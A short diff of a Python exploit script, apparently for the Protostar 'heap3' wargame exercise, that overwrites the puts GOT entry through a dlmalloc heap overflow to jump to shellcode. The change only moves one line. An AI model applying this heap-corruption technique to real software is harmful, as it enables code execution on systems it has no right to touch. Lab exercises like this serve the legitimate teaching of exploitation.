@@ -13,8 +13,8 @@ def main():
 
     arg1 = "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3"
     arg2, arg3 = HeapFrame("dlmalloc", puts_got, shellcode_address).get_exploit()
-    arg2 = "A"*32 + arg2
 
+    arg2 = "A"*32 + arg2
     p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
     print p.recvline()
 
